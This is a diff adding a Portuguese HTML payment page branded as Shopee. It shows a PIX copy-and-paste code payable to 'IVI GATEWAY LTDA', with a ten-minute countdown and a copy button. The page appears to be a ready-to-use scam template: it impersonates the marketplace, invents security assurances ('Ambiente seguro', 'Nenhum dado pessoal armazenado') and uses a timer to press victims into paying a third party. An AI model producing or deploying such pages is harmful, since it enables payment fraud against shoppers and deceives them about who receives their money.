@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Shopee - Pagamento Seguro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+
+        .container {
+            background-color: #161b22;
+            width: 100%;
+            max-width: 480px;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo img {
+            max-width: 110px;
+            width: 100%;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+
+        .secure {
+            text-align: center;
+            font-size: 14px;
+            color: #3fb950;
+            margin-bottom: 15px;
+        }
+
+        .timer-box {
+            background-color: #010409;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 1px solid #238636;
+        }
+
+        .timer {
+            font-size: 22px;
+            font-weight: bold;
+            color: #f85149;
+        }
+
+        .info {
+            background-color: #0d1117;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border-left: 4px solid #238636;
+        }
+
+        pre {
+            background-color: #010409;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #238636;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background-color: #30363d;
+            cursor: not-allowed;
+        }
+
+        .mensagem {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 14px;
+            color: #3fb950;
+        }
+
+        .expired {
+            text-align: center;
+            color: #f85149;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+
+            .timer {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- LOGO (ALTERE A URL) -->
+    <div class="logo">
+        <img src="logo.png">
+    </div>
+
+    <!-- NOME DA LOJA -->
+    <h1>Shopee Pagamentos</h1>
+
+    <div class="secure">
+        🔒 Pagamento protegido • Ambiente seguro
+    </div>
+
+    <!-- CONTADOR -->
+    <div class="timer-box">
+        Finalize o pagamento em:<br>
+        <span class="timer" id="timer">10:00</span>
+    </div>
+
+    <!-- INFORMAÇÕES DE CONFIANÇA -->
+    <div class="info">
+        ✔ Conexão criptografada (HTTPS)<br>
+        ✔ Nenhum dado pessoal armazenado<br>
+        ✔ Código válido por tempo limitado
+    </div>
+
+    <!-- CÓDIGO -->
+    <pre id="codigo">
+00020101021226790014br.gov.bcb.pix2557qrcode.mwbank.com.br/cob/699e2f24791f4a7c8010892526e843035204000053039865802BR5916IVI GATEWAY LTDA6009JOINVILLE62070503***63047A09
+    </pre>
+
+    <!-- BOTÃO -->
+    <button id="btnCopiar">Copiar Código</button>
+
+    <div class="mensagem" id="mensagem"></div>
+    <div class="expired" id="expired" style="display:none;">
+        ⛔ Tempo expirado. Gere um novo código para continuar.
+    </div>
+
+    <div class="footer">
+        Sistema automático • Acesso temporário • Monitoramento ativo
+    </div>
+
+</div>
+
+<script>
+    const tempoInicial = 10 * 60; // 10 minutos em segundos
+    let tempoRestante = tempoInicial;
+
+    const timerEl = document.getElementById("timer");
+    const btnCopiar = document.getElementById("btnCopiar");
+    const mensagem = document.getElementById("mensagem");
+    const expired = document.getElementById("expired");
+    const codigoEl = document.getElementById("codigo");
+
+    function atualizarTimer() {
+        const minutos = Math.floor(tempoRestante / 60);
+        const segundos = tempoRestante % 60;
+
+        timerEl.textContent =
+            String(minutos).padStart(2, "0") + ":" +
+            String(segundos).padStart(2, "0");
+
+        if (tempoRestante <= 0) {
+            clearInterval(intervalo);
+            btnCopiar.disabled = true;
+            codigoEl.textContent = "CÓDIGO EXPIRADO";
+            expired.style.display = "block";
+            mensagem.textContent = "";
+        }
+
+        tempoRestante--;
+    }
+
+    const intervalo = setInterval(atualizarTimer, 1000);
+
+    btnCopiar.addEventListener("click", function () {
+        if (tempoRestante > 0) {
+            navigator.clipboard.writeText(codigoEl.innerText.trim())
+                .then(() => {
+                    mensagem.textContent = "Código copiado com sucesso!";
+                })
+                .catch(() => {
+                    mensagem.textContent = "Erro ao copiar o código.";
+                });
+        }
+    });
+</script>
+
+</body>
+</html>
